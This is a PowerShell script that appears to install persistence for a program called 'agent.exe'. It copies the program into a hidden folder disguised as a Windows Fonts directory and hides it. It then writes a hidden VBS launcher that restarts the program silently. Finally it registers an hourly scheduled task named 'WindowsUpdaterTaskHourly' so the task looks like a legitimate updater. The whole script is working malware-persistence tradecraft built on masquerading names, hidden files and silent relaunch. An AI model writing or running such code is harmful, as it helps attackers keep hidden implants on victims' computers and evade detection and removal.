$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

# 1. Find running agent
$agentProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $agentProc) {
    Write-Output "ERROR: No running agent.exe found. Start your agent first."
    exit 1
}
$source = $agentProc.Path
Write-Host "[+] Found agent (PID: $($agentProc.Id)) at: $source"

# 2. Stop the agent so we can copy it
Write-Host "[+] Stopping agent..."
Stop-Process -Id $agentProc.Id -Force
Start-Sleep -Seconds 1

# 3. Copy to hidden fonts folder (with retry in case lock lingers)
$destDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    attrib +h $destDir
}
$dest = "$destDir\agent.exe"
if (Test-Path $dest) { Remove-Item $dest -Force }

$copied = $false
for ($i = 0; $i -lt 5; $i++) {
    try {
        Copy-Item -LiteralPath $source -Destination $dest -Force -ErrorAction Stop
        if (Test-Path $dest) {
            $copied = $true
            break
        }
    } catch {
        Write-Host "[!] Copy attempt $($i+1) failed: $($_.Exception.Message)"
        Start-Sleep -Milliseconds 500
    }
}
if (-not $copied) {
    Write-Output "ERROR: Failed to copy agent after 5 attempts."
    exit 1
}
attrib +h $dest
Write-Host "[+] Agent copied to: $dest ($((Get-Item $dest).Length) bytes)"

# 4. Create VBS launcher (runs agent directly, kills any existing first)
$vbs = "$destDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
' Kill any existing agent.exe processes
WshShell.Run "taskkill /f /im agent.exe", 0, True
' Wait a moment
WScript.Sleep 1000
' Start the new agent
WshShell.Run "`"$dest`"", 0, False
"@
Set-Content -Path $vbs -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbs
Write-Host "[+] Created VBS launcher: $vbs"

# 5. Create hourly scheduled task (no admin needed)
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbs`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Scheduled task created (runs every hour)"
} else {
    Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
    exit 1
}

# 6. Start the agent now using the VBS launcher (kills old, starts new)
Write-Host "[+] Starting agent from hidden folder via VBS..."
wscript.exe "$vbs"
Start-Sleep -Seconds 2

# Verify
$newProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue
if ($newProc) {
    Write-Host "✅ Agent is running from: $($newProc.Path)" -Fore Green
} else {
    Write-Host "⚠️ Agent not running yet – task will start it at next hour." -Fore Yellow
}

Write-Host "`n✅ PERSISTENCE COMPLETE"
Write-Host "Agent location: $dest (hidden)"
Write-Host "Task '$taskName' will re-launch every hour"
